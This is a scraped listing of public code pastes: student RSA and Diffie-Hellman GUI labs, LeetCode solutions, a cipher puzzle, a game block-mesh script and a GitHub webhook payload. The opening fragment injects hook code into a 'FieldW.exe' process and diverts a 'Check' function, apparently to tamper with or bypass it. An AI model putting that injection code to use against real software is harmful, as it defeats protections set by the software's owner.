    WriteProcessMemory(hProcess, pHookCode, (LPCVOID)Hook_Check, 4096, &written);

    // Инициализация Detours и перехват функции
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    // Адрес оригинальной функции
    Original_Check = (Real_Check)TARGET_FUNCTION_ADDRESS;

    // Установка перехвата
    DetourAttach(&(PVOID&)Original_Check, (PVOID)pHookCode);

    DetourTransactionCommit();

    CloseHandle(hProcess);
}

int main() {
    const char* processName = ""FieldW.exe"";
    DWORD processId = GetProcessIdByName(processName);
    if (processId == 0) {
        MessageBoxA(NULL, ""Процесс не найден"", ""Ошибка"", MB_OK);
        return 1;
    }

    InjectAndHook(processId);

    return 0;
}
"
805fjTBx,lr_4_krypta,Teammasik,Python,Tuesday 28th of May 2024 12:41:37 PM CDT,"import random
import tkinter as tk
from tkinter import messagebox

# 23 13 16

def is_prime(n):
    d = 2
    while n % d != 0:
        d += 1
    return d == n


def find_primitive_root(q):
    # Находим факторы
    if not is_prime(q):
        messagebox.showinfo(""Ошибка!"", f""Число q не простое!"")
        return None
    factors = prime_factors(q - 1)

    while True:
        a = random.randint(2, q - 1)
        if all(pow(a, (q - 1) // p, q) != 1 for p in factors):
            return a


def prime_factors(n):
    # Нахождение простых множителей числа.
    i = 2
    factors = []
    while i * i <= n:
        if n % i:
            i += 1
        else:
            n //= i
            factors.append(i)
    if n > 1:
        factors.append(n)
    return factors


def calculate_key(q, alpha, Xa, Xb):
    Ya = (alpha ** Xa) % q
    Yb = (alpha ** Xb) % q

    Ka = (Yb ** Xa) % q
    Kb = (Ya ** Xb) % q

    if Ka == Kb:
        return Ka
    else:
        return None


def calculate_key_button_click():
    try:
        q = int(q_entry.get())
        Xa = int(Xa_entry.get())
        Xb = int(Xb_entry.get())
        alpha = find_primitive_root(q)

        key = calculate_key(q, alpha, Xa, Xb)
        if key is not None:
            result_label.config(text=f""Ключ: {key}"")
        else:
            result_label.config(text=""Ошибка: ключи не совпадают."")
    except ValueError:
        messagebox.showerror(""Ошибка"", ""Введите корректные числовые значения."")


root = tk.Tk()
root.title(""Алгоритм Диффи-Хелмана"")

q_label = tk.Label(root, text=""Простое число q:"")
q_label.pack()
q_entry = tk.Entry(root)
q_entry.pack()

Xa_label = tk.Label(root, text=""Число Xa:"")
Xa_label.pack()
Xa_entry = tk.Entry(root)
Xa_entry.pack()

Xb_label = tk.Label(root, text=""Число Xb:"")
Xb_label.pack()
Xb_entry = tk.Entry(root)
Xb_entry.pack()


# Ya_label = tk.Label(root, text=""Число Xa:"") # TODO доделать 2 кнопки на передачу открытых значений чтобы можно
#                                             # было наебать
# Ya_label.pack()
# Ya_entry = tk.Entry(root)
# Ya_entry.pack()
# 
# Yb_label = tk.Label(root, text=""Число Xb:"")
# Yb_label.pack()
# Yb_entry = tk.Entry(root)
# Yb_entry.pack()

calculate_button = tk.Button(root, text=""Вычислить ключ"", command=calculate_key_button_click)
calculate_button.pack()

result_label = tk.Label(root, text="""")
result_label.pack()

root.mainloop()
"
eASzuFgC,laba_3_krypta,Teammasik,Python,Tuesday 28th of May 2024 12:41:12 PM CDT,"import tkinter as tk
from tkinter import messagebox
import random

abc = {chr(i): (ord(chr(i)) - ord('а') + 1) for i in range(ord('а'), ord('я') + 1)}


def calculate_n(p, q):
    return p * q


def calculate_phi(p, q):
    return (p - 1) * (q - 1)


def calculate_e(phi):
    g = 0
    e = 3
    while g != 1:
        e = random.randrange(1, phi)
        if is_prime(e):
            g = gcd(e, phi)
    return e


def calculate_e_v2(phi_n):
    while True:
        e = random.randint(2, phi_n)
        if gcd(e, phi_n) == 1:
            return e


def calculate_d(e, phi):
    d = 0
    while (e * d) % phi != 1:
        d += 1
    return d


def is_prime(n):
    d = 2
    while n % d != 0:
        d += 1
    return d == n


def gcd(a, b):
    while b != 0:
        a, b = b, a % b
    return a


def get_key(d, value):
    for k, v in d.items():
        if v == value:
            return k


def encrypt(e, n, plaintext):
    ciphertext = [(abc[char] ** e) % n for char in plaintext]
    text = [abc[char] for char in plaintext]
    print(text)
    return ciphertext


def decrypt(private_key, ciphertext):
    p, q, phi, d = private_key
    n = p * q
    plaintext = []

    for i in ciphertext:
        print(i, (i ** d) % n, get_key(abc, ((i ** d) % n)))

    for num in ciphertext:
        plaintext.append(get_key(abc, ((num ** d) % n)))
    return ''.join(plaintext)


def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        g, x, y = extended_gcd(b % a, a)
        return g, y - (b // a) * x, x


def solve_comparison_equation(a, n):
    b = 1
    g, x0, _ = extended_gcd(a, n)

    if b % g != 0:
        return -1
    else:
        x0 = (x0 * (b // g)) % n
        return x0


def create_keys():
    p = int(entry_p.get(""1.0"", tk.END))
    q = int(entry_q.get(""1.0"", tk.END))

    n = calculate_n(p, q)
    phi = calculate_phi(p, q)
    e = calculate_e(phi)
    # d = solve_comparison_equation(e, phi)
    d = calculate_d(e, phi)

    global open_keys, closed_keys
    open_keys = [n, e]
    closed_keys = [p, q, phi, d]
    messagebox.showinfo(""Результат дешифрования"", f""Расшифрованный текст: {open_keys, closed_keys}"")


def encrypt_message():
    plaintext = entry_plaintext.get(""1.0"", tk.END)[0:-1]
    entry_plaintext.delete('1.0', tk.END)
    e = open_keys[1]
    n = open_keys[0]

    ciphertext = encrypt(e, n, plaintext)
    text_area.delete('1.0', tk.END)
    text_area.insert('1.0', ','.join(map(str, ciphertext)))
    messagebox.showinfo(""Результат шифрования"", f""Зашифрованный текст: {ciphertext}"")


def decrypt_message():
    ciphertext = [int(char) for char in text_area.get('1.0', tk.END).split(',')]
    plaintext = decrypt(closed_keys, ciphertext)
    messagebox.showinfo(""Результат дешифрования"", f""Расшифрованный текст: {plaintext}"")


root = tk.Tk()
root.title(""Алгоритм RSA"")

closed_keys = []  # p, q, phi, d
open_keys = []  # e,n


frame_keys = tk.Frame(root)
frame_keys.pack(pady=10)

button_create_keys = tk.Button(frame_keys, text=""Создать ключи"", command=create_keys)  # todo
button_create_keys.pack()

frame_encrypted_text = tk.Frame(root)
frame_encrypted_text.pack(pady=10)

label_encrypted_text = tk.Label(frame_encrypted_text, text=""зашифрованное сообщение:"")
label_encrypted_text.pack(side=tk.LEFT)

text_area = tk.Text(frame_encrypted_text, height=2, width=15)
text_area.pack(side=tk.LEFT)

button_decrypt = tk.Button(frame_encrypted_text, text=""Расшифровать"", command=decrypt_message)
button_decrypt.pack(side=tk.RIGHT)

frame_encrypt = tk.Frame(root)
frame_encrypt.pack(pady=10)

label_p = tk.Label(frame_encrypt, text=""p:"")
label_p.pack(side=tk.LEFT)

entry_p = tk.Text(frame_encrypt, height=1, width=15)
entry_p.pack(side=tk.LEFT)

label_q = tk.Label(frame_encrypt, text=""q:"")
label_q.pack(side=tk.LEFT)

entry_q = tk.Text(frame_encrypt, height=1, width=15)
entry_q.pack(side=tk.LEFT)

label_plaintext = tk.Label(frame_encrypt, text=""Текст:"")
label_plaintext.pack(side=tk.LEFT)

entry_plaintext = tk.Text(frame_encrypt, height=1, width=15)
entry_plaintext.pack(side=tk.LEFT)

button_encrypt = tk.Button(frame_encrypt, text=""Зашифровать"", command=encrypt_message)
button_encrypt.pack(side=tk.LEFT)

root.mainloop()
"
XjbCu5VQ,cypher,b_gandurov,C#,Tuesday 28th of May 2024 12:38:22 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

class Program
{
    static Dictionary<string, char> cipherMap;
    static List<string> results;

    static void Main()
    {
        string secretCode = Console.ReadLine();
        string cipher = Console.ReadLine();

        cipherMap = ParseCipher(cipher);
        results = new List<string>();

        FindMesssage(secretCode, 0, """");

        Console.WriteLine(results.Count);
        foreach (var message in results.OrderBy(m => m))
        {
            Console.WriteLine(message);
        }
    }

    static Dictionary<string, char> ParseCipher(string cipher)
    {
        Dictionary<string, char> map = new Dictionary<string, char>();
        int i = 0;
        while (i < cipher.Length)
        {
            char letter = cipher[i];
            i++;
            string digits = """";
            while (i < cipher.Length && char.IsDigit(cipher[i]))
            {
                digits += cipher[i];
                i++;
            }
            map[digits] = letter;
        }
        return map;
    }

    static void FindMesssage(string secretCode, int index, string currentMessage)
    {
        if (index == secretCode.Length)
        {
            results.Add(currentMessage);
            return;
        }

        for (int len = 1; len <= secretCode.Length - index; len++)
        {
            string key = secretCode.Substring(index, len);
            if (cipherMap.ContainsKey(key))
            {
                FindMesssage(secretCode, index + len, currentMessage + cipherMap[key]);
            }
        }

    }
}"
zbD4EpFi,Evaluate Division,jayati,C++,Tuesday 28th of May 2024 12:07:12 PM CDT,"class Solution {
public:
    double dfs(string src,string dst,unordered_map<string,vector<pair<string,double>>> adjlist,set<string> vis)
    {

        if(vis.find(src)!=vis.end())
        {
             return -1.0;
        }
        if(src==dst)
        {
            return 1.0;
        }
        vis.insert(src);
        for(auto u:adjlist[src])
        {
           
            double tmp=dfs(u.first,dst,adjlist,vis);
            if(tmp!=-1.0)
            {
                return tmp*(u.second);
            }
        }
        return -1.0;
    }
    vector<double> calcEquation(vector<vector<string>>& equations, vector<double>& values, vector<vector<string>>& queries) {
        unordered_map<string,vector<pair<string,double>>> adjlist;
        set<string> node;

        for(int i=0;i<equations.size();i++)
        {
            auto u = equations[i];
            adjlist[u[0]].push_back({u[1],values[i]});
            adjlist[u[1]].push_back({u[0],(double)(1/values[i])});

            node.insert(u[0]);
            node.insert(u[1]);
        }
        vector<double> ans;
        for(auto q:queries)
        {
            set<string> vis;
            if(node.find(q[0])==node.end() || node.find(q[1])==node.end())
            {
                ans.push_back(-1);
            }
            else
            {
                ans.push_back(dfs(q[0],q[1],adjlist,vis));
            }
        }
        return ans;
    }
};"
Er85GFMf,Untitled,MeehoweCK,C++,Tuesday 28th of May 2024 12:07:04 PM CDT,"#include <iostream>

int main() {
	auto a{ 5 };
	++a;		// operator preinkrementacji (zwiększenie wartości a o 1)
	std::cout << a << std::endl;		// 6
	a++;		// operator postinkrementacji
	std::cout << a << std::endl;		// 7

	auto b{ 13 };
	--b;		// operator predekremantacji (zmniejszenie wartości b o 1)
	std::cout << b << std::endl;		// 12
	b--;		// operator postdekrementacji
	std::cout << b << std::endl;		// 11

	return 0;
}"
3057jSv6,Untitled,Ilya_Bykonya,C++,Tuesday 28th of May 2024 11:56:56 AM CDT,"
std::vector<int> permutation_positions(const std::string& s1, const std::string& s2) {
    if(s1.length() < s2.length())
        return {};

    std::map<char, int64_t> letters{};
    for(auto letter: s2) { ++letters[letter]; }
    for(size_t index = 0; index < s2.length(); ++index) {
        --letters[s1[index]];
    }

    std::vector<int> results{};
    for(size_t index = 0; index < (s1.length() - s2.length()); ++index) {
        std::cout << letters << std::endl;
        if(std::all_of(letters.begin(), letters.end(), [](const auto& pair) { return pair.second == 0; })) {
            results.push_back(index);
        }

        --letters[s1[index + s2.length()]];
        ++letters[s1[index]];
    }
    if(std::all_of(letters.begin(), letters.end(), [](const auto& pair) { return pair.second == 0; })) {
        results.push_back(s1.length() - s2.length());
    }

    return results;
}
"
QzJzRuAt,grass_stairs.rhai,fisharmy100,Rust,Tuesday 28th of May 2024 11:35:45 AM CDT,"fn name() { ""grass_stairs"" }
fn display_name() { ""Grass Stairs"" }
fn visibility() { ""transparent"" }
fn model()
{
    let textures = [
        tex_ref(uvec2(0, 0), uvec2(16, 16), ""block_game_tileset.png""), // dirt
        tex_ref(uvec2(48, 0), uvec2(16, 16), ""block_game_tileset.png""), // grass edge
        tex_ref(uvec2(32, 0), uvec2(16, 16), ""block_game_tileset.png""), // grass
    ];

    let vertices = [
        // Upper top face
        vertex(vec3(0.0, 1.0, 0.0), uvec2(0, 0), 2),
        vertex(vec3(1.0, 1.0, 0.0), uvec2(16, 0), 2),
        vertex(vec3(0.0, 1.0, 0.5), uvec2(0, 8), 2),
        vertex(vec3(1.0, 1.0, 0.5), uvec2(16, 8), 2),

        // Bottom face
        vertex(vec3(0.0, 0.0, 0.0), uvec2(0, 0), 0),
        vertex(vec3(1.0, 0.0, 0.0), uvec2(16, 0), 0),
        vertex(vec3(0.0, 0.0, 1.0), uvec2(0, 16), 0),
        vertex(vec3(1.0, 0.0, 1.0), uvec2(16, 16), 0),

        // North Face
        vertex(vec3(1.0, 0.0, 0.0), uvec2(0, 16), 1),
        vertex(vec3(1.0, 1.0, 0.0), uvec2(0, 0), 1),
        vertex(vec3(0.0, 1.0, 0.0), uvec2(16, 0), 1),
        vertex(vec3(0.0, 0.0, 0.0), uvec2(16, 16), 1),

        // Lower South face
        vertex(vec3(0.0, 0.0, 1.0), uvec2(0, 8), 1),
        vertex(vec3(0.0, 0.5, 1.0), uvec2(0, 0), 1),
        vertex(vec3(1.0, 0.5, 1.0), uvec2(16, 0), 1),
        vertex(vec3(1.0, 0.0, 1.0), uvec2(16, 8), 1),

        // Lower top face
        vertex(vec3(0.0, 0.5, 0.5), uvec2(0, 0), 2),
        vertex(vec3(1.0, 0.5, 0.5), uvec2(16, 0), 2),
        vertex(vec3(0.0, 0.5, 1.0), uvec2(0, 8), 2),
        vertex(vec3(1.0, 0.5, 1.0), uvec2(16, 8), 2),

        // Upper South Face
        vertex(vec3(0.0, 0.5, 0.5), uvec2(0, 8), 1),
        vertex(vec3(0.0, 1.0, 0.5), uvec2(0, 0), 1),
        vertex(vec3(1.0, 1.0, 0.5), uvec2(16, 0), 1),
        vertex(vec3(1.0, 0.5, 0.5), uvec2(16, 8), 1),

        // Short east face
        vertex(vec3(1.0, 0.0, 1.0), uvec2(0, 8), 1),
        vertex(vec3(1.0, 0.5, 1.0), uvec2(0, 0), 1),
        vertex(vec3(1.0, 0.5, 0.5), uvec2(8, 0), 1),
        vertex(vec3(1.0, 0.0, 0.5), uvec2(8, 8), 1),

        // Tall east face
        vertex(vec3(1.0, 0.0, 0.5), uvec2(0, 16), 1),
        vertex(vec3(1.0, 1.0, 0.5), uvec2(0, 0), 1),
        vertex(vec3(1.0, 1.0, 0.0), uvec2(8, 0), 1),
        vertex(vec3(1.0, 0.0, 0.0), uvec2(8, 16), 1),

        // Short west face
        vertex(vec3(0.0, 0.0, 0.5), uvec2(0, 8), 1),
        vertex(vec3(0.0, 0.5, 0.5), uvec2(0, 0), 1),
        vertex(vec3(0.0, 0.5, 1.0), uvec2(8, 0), 1),
        vertex(vec3(0.0, 0.0, 1.0), uvec2(8, 8), 1),

        // Tall west face
        vertex(vec3(0.0, 0.0, 0.0), uvec2(0, 16), 1),
        vertex(vec3(0.0, 1.0, 0.0), uvec2(0, 0), 1),
        vertex(vec3(0.0, 1.0, 0.5), uvec2(8, 0), 1),
        vertex(vec3(0.0, 0.0, 0.5), uvec2(8, 16), 1),
    ];

    let indices = [
        // Top face
        2, 1, 0, 2, 3, 1,

        // Bottom face
        4, 5, 6, 5, 7, 6,

        // North face
        10, 9, 8, 10, 8, 11,

        // Lower South face
        14, 13, 12, 14, 12, 15,

        // Lower Top face
        18, 17, 16, 18, 19, 17,

        // Upper South face
        22, 21, 20, 22, 20, 23,

        // Short east face
        26, 25, 24, 26, 24, 27,

        // Tall east face
        30, 29, 28, 30, 28, 31,

        // Short west face
        34, 33, 32, 34, 32, 35,

        // Tall west face
        38, 37, 36, 38, 36, 39,
    ];

    mesh(vertices, indices, textures)
}"
e2Cs5WeT,Untitled,Ilya_Bykonya,C++,Tuesday 28th of May 2024 11:34:46 AM CDT,"bool is_permutation(const std::string& s1, const std::string& s2) {
    std::map<char, int64_t> letters{};
    for(auto letter: s1)
        ++letters[letter];
    for(auto letter: s2)
        --letters[letter];
    return std::all_of(letters.begin(), letters.end(), [](const auto& pair) {
        return pair.second == 0;
    });
}
"
EnpRH3xM,Github Pull Request Payload,wesdrum,JSON,Tuesday 28th of May 2024 11:15:45 AM CDT,"{
  ""action"": ""closed"",
  ""number"": 799,
  ""pull_request"": {
    ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799"",
    ""id"": 1890570845,
    ""node_id"": ""PR_kwDOEcz4_s5wr9Jd"",
    ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799"",
    ""diff_url"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799.diff"",
    ""patch_url"": ""https://github.com/hetosoft/ProjetosSol.WEB/pull/799.patch"",
    ""issue_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799"",
    ""number"": 799,
    ""state"": ""closed"",
    ""locked"": false,
    ""title"": ""ajustes visuais  portal `HetoBank`"",
    ""user"": {
      ""login"": ""LuanNascimento-Hetosoft"",
      ""id"": 126170160,
      ""node_id"": ""U_kgDOB4U0MA"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/126170160?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/LuanNascimento-Hetosoft"",
      ""html_url"": ""https://github.com/LuanNascimento-Hetosoft"",
      ""followers_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/followers"",
      ""following_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/orgs"",
      ""repos_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/repos"",
      ""events_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/LuanNascimento-Hetosoft/received_events"",
      ""type"": ""User"",
      ""site_admin"": false
    },
    ""body"": null,
    ""created_at"": ""2024-05-27T17:50:42Z"",
    ""updated_at"": ""2024-05-28T14:47:00Z"",
    ""closed_at"": ""2024-05-28T14:47:00Z"",
    ""merged_at"": ""2024-05-28T14:47:00Z"",
    ""merge_commit_sha"": ""89d3cd7eb6809afc2c8878e8d597cf9f5d0ee5b3"",
    ""assignee"": null,
    ""assignees"": [

    ],
    ""requested_reviewers"": [

    ],
    ""requested_teams"": [

    ],
    ""labels"": [

    ],
    ""milestone"": null,
    ""draft"": false,
    ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/commits"",
    ""review_comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/799/comments"",
    ""review_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls/comments{/number}"",
    ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/799/comments"",
    ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/9b9f7df6cb297d7d09f7cce4bf85ae52b9db9887"",
    ""head"": {
      ""label"": ""hetosoft:796-194442-solnet_web_hetobankalterar-label-de-botoes-e-nao-esta-replicando-configuracao"",
      ""ref"": ""796-194442-solnet_web_hetobankalterar-label-de-botoes-e-nao-esta-replicando-configuracao"",
      ""sha"": ""9b9f7df6cb297d7d09f7cce4bf85ae52b9db9887"",
      ""user"": {
        ""login"": ""hetosoft"",
        ""id"": 53792964,
        ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
        ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
        ""gravatar_id"": """",
        ""url"": ""https://api.github.com/users/hetosoft"",
        ""html_url"": ""https://github.com/hetosoft"",
        ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
        ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
        ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
        ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
        ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
        ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
        ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
        ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
        ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
        ""type"": ""Organization"",
        ""site_admin"": false
      },
      ""repo"": {
        ""id"": 298645758,
        ""node_id"": ""MDEwOlJlcG9zaXRvcnkyOTg2NDU3NTg="",
        ""name"": ""ProjetosSol.WEB"",
        ""full_name"": ""hetosoft/ProjetosSol.WEB"",
        ""private"": true,
        ""owner"": {
          ""login"": ""hetosoft"",
          ""id"": 53792964,
          ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
          ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
          ""gravatar_id"": """",
          ""url"": ""https://api.github.com/users/hetosoft"",
          ""html_url"": ""https://github.com/hetosoft"",
          ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
          ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
          ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
          ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
          ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
          ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
          ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
          ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
          ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
          ""type"": ""Organization"",
          ""site_admin"": false
        },
        ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""description"": ""Projetos Hetosoft .NET"",
        ""fork"": false,
        ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB"",
        ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/forks"",
        ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/keys{/key_id}"",
        ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/collaborators{/collaborator}"",
        ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/teams"",
        ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/hooks"",
        ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/events{/number}"",
        ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/events"",
        ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/assignees{/user}"",
        ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/branches{/branch}"",
        ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/tags"",
        ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/blobs{/sha}"",
        ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/tags{/sha}"",
        ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/refs{/sha}"",
        ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/trees{/sha}"",
        ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/statuses/{sha}"",
        ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/languages"",
        ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/stargazers"",
        ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contributors"",
        ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscribers"",
        ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/subscription"",
        ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/commits{/sha}"",
        ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/git/commits{/sha}"",
        ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/comments{/number}"",
        ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues/comments{/number}"",
        ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/contents/{+path}"",
        ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/compare/{base}...{head}"",
        ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/merges"",
        ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/{archive_format}{/ref}"",
        ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/downloads"",
        ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/issues{/number}"",
        ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/pulls{/number}"",
        ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/milestones{/number}"",
        ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/notifications{?since,all,participating}"",
        ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/labels{/name}"",
        ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/releases{/id}"",
        ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/deployments"",
        ""created_at"": ""2020-09-25T18:04:07Z"",
        ""updated_at"": ""2024-05-28T13:06:46Z"",
        ""pushed_at"": ""2024-05-28T14:44:55Z"",
        ""git_url"": ""git://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.WEB.git"",
        ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.WEB.git"",
        ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""homepage"": null,
        ""size"": 621172,
        ""stargazers_count"": 0,
        ""watchers_count"": 0,
        ""language"": ""C#"",
        ""has_issues"": true,
        ""has_projects"": true,
        ""has_downloads"": true,
        ""has_wiki"": true,
        ""has_pages"": false,
        ""has_discussions"": true,
        ""forks_count"": 0,
        ""mirror_url"": null,
        ""archived"": false,
        ""disabled"": false,
        ""open_issues_count"": 15,
        ""license"": null,
        ""allow_forking"": false,
        ""is_template"": false,
        ""web_commit_signoff_required"": false,
        ""topics"": [

        ],
        ""visibility"": ""private"",
        ""forks"": 0,
        ""open_issues"": 15,
        ""watchers"": 0,
        ""default_branch"": ""master"",
        ""allow_squash_merge"": true,
        ""allow_merge_commit"": true,
        ""allow_rebase_merge"": true,
        ""allow_auto_merge"": false,
        ""delete_branch_on_merge"": false,
        ""allow_update_branch"": false,
        ""use_squash_pr_title_as_default"": false,
        ""squash_merge_commit_message"": ""COMMIT_MESSAGES"",
        ""squash_merge_commit_title"": ""COMMIT_OR_PR_TITLE"",
        ""merge_commit_message"": ""PR_TITLE"",
        ""merge_commit_title"": ""MERGE_MESSAGE""
      }
    },
    ""base"": {
      ""label"": ""hetosoft:master"",
      ""ref"": ""master"",
      ""sha"": ""491817861bc3e6c23f0aafc638298fb9c273ac6e"",
      ""user"": {
        ""login"": ""hetosoft"",
        ""id"": 53792964,
        ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
        ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
        ""gravatar_id"": """",
        ""url"": ""https://api.github.com/users/hetosoft"",
        ""html_url"": ""https://github.com/hetosoft"",
        ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
        ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
        ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
        ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
        ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
        ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
        ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
        ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
        ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
        ""type"": ""Organization"",
        ""site_admin"": false
      },
      ""repo"": {
        ""id"": 298645758,
        ""node_id"": ""MDEwOlJlcG9zaXRvcnkyOTg2NDU3NTg="",
        ""name"": ""ProjetosSol.WEB"",
        ""full_name"": ""hetosoft/ProjetosSol.WEB"",
        ""private"": true,
        ""owner"": {
          ""login"": ""hetosoft"",
          ""id"": 53792964,
          ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
          ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
          ""gravatar_id"": """",
          ""url"": ""https://api.github.com/users/hetosoft"",
          ""html_url"": ""https://github.com/hetosoft"",
          ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
          ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
          ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
          ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
          ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
          ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
          ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
          ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
          ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
          ""type"": ""Organization"",
          ""site_admin"": false
        },
        ""html_url"": ""https://github.com/hetosoft/ProjetosSol.WEB"",
        ""description"": ""Projetos Hetosoft .NET"",
        ""fork"": false,
        ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB"",
        ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.WEB/forks"",
